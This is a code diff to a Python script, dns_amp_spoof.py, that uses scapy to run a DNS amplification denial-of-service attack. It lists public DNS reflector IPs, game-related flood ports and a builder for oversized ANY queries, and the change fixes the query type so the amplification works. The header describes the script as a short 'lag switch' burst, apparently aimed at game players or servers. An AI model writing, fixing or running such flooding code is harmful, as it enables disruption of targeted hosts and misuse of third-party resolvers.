@@ -1,11 +1,11 @@
-# dns_amp_spoof.py — 3-second hybrid lag switch burst
+# dns_amp_spoof.py — FIXED QTYPE for ANY + 3-second hybrid burst
 import random
 import time
 import sys
 from scapy.all import IP, UDP, send, DNS, DNSQR, Raw
 
 # === CONFIGURATION ===
-DURATION = 3  # seconds (true lag switch burst)
+DURATION = 3  # seconds
 RAW_FLOOD_PORTS = [7777, 8000, 9000, 12000]
 REFLECTORS = [
     "185.222.222.222", "193.110.157.123", "185.156.175.61",
@@ -16,7 +16,7 @@ REFLECTORS = [
 # === DNS QUERY BUILDER ===
 def build_heavy_dns_query():
     qname = ".".join(["a" * 60 for _ in range(5)]) + ".com"
-    return DNS(rd=1, id=random.randint(0, 65535), qd=DNSQR(qname=qname, qtype="ANY"))
+    return DNS(rd=1, id=random.randint(0, 65535), qd=DNSQR(qname=qname, qtype=255))  # qtype=255 = ANY
 
 # === DNS REFLECTION ===
 def dns_amplification(target_ip):
